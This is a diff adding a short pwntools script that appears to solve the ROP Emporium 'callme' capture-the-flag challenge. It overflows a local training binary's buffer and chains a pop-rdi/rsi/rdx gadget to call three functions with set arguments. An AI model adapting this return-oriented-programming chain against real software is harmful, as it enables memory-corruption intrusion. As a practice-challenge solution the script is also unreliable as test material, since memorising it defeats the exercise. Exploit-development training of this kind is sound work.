@@ -1,0 +1,30 @@
+from pwn import *
+
+p = process('./callme')
+
+gad = 0x0040093c # pop rdi ; pop rsi ; pop rdx ; ret
+
+a1 = 0x00400720
+a2 = 0x00400740
+a3 = 0x004006f0
+
+payload  = 'A'*40
+payload += p64(gad)
+payload += p64(0xdeadbeefdeadbeef)
+payload += p64(0xcafebabecafebabe)
+payload += p64(0xd00df00dd00df00d)
+payload += p64(a1)
+payload += p64(gad)
+payload += p64(0xdeadbeefdeadbeef)
+payload += p64(0xcafebabecafebabe)
+payload += p64(0xd00df00dd00df00d)
+payload += p64(a2)
+payload += p64(gad)
+payload += p64(0xdeadbeefdeadbeef)
+payload += p64(0xcafebabecafebabe)
+payload += p64(0xd00df00dd00df00d)
+payload += p64(a3)
+
+p.recvuntil('>')
+p.sendline(payload)
+print(p.recvall())
